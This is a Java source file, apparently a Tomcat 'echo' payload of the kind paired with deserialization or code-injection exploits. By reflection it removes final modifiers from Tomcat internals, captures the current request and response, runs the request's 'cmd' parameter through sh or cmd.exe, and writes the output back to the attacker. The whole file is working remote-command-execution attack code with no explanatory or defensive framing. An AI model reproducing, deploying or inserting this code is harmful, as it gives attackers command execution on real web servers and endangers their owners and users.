package com.echo;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

public class TomcatEcho{
    public TomcatEcho() throws Exception{
        Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
        Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
        Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
        modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
        modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
        WRAP_SAME_OBJECT_FIELD.setAccessible(true);
        lastServicedRequestField.setAccessible(true);
        lastServicedResponseField.setAccessible(true);

        ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
        ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
        boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
        String cmd = lastServicedRequest != null ? lastServicedRequest.get().getParameter("cmd") : null;
        if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
            lastServicedRequestField.set(null, new ThreadLocal<>());
            lastServicedResponseField.set(null, new ThreadLocal<>());
            WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
        } else if (cmd != null) {
            ServletResponse responseFacade = lastServicedResponse.get();
            responseFacade.getWriter();
            java.io.Writer w = responseFacade.getWriter();
            Field responseField = ResponseFacade.class.getDeclaredField("response");
            responseField.setAccessible(true);
            Response response = (Response) responseField.get(responseFacade);
            Field usingWriter = Response.class.getDeclaredField("usingWriter");
            usingWriter.setAccessible(true);
            usingWriter.set((Object) response, Boolean.FALSE);

            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            w.write(output);
            w.flush();
        }
    }
}
